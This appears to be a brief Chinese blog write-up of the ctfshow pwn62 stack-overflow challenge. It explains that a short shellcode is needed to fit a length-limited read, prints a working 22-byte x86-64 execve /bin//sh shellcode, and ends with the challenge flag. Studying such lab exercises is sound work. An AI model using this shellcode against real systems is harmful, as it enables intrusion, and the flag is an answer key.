---
title: "ctfshow stack overflow pwn62"
published: 2026-05-14T00:04:00+08:00
description: "Writeup for ctfshow stack overflow pwn62."
image: ""
tags: ["ctfshow", "stack-overflow", "Pwn", "shellcode"]
category: "ctfshow"
categoryPath: ["ctfshow", "stack-overflow"]
series: "ctfshow-stack-overflow"
draft: false
lang: "zh_CN"
---

![shot 1](/attachments/ctfshow/stack-overflow/pwn62/01-shot-1.png)

![shot 2](/attachments/ctfshow/stack-overflow/pwn62/02-shot-2.png)

![shot 3](/attachments/ctfshow/stack-overflow/pwn62/03-shot-3.png)

这次的 `read` 有长度限制，用之前 pwntools 自动产生的 shellcode 太长了，所以要去找点短的 shellcode。

![shot 4](/attachments/ctfshow/stack-overflow/pwn62/04-shot-4.png)

```python
b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'  # 64bit
```

exp：

![shot 5](/attachments/ctfshow/stack-overflow/pwn62/05-shot-5.png)

![shot 6](/attachments/ctfshow/stack-overflow/pwn62/06-shot-6.png)

`ctfshow{edbce10e-4499-421b-b104-7058ead92b0e}`
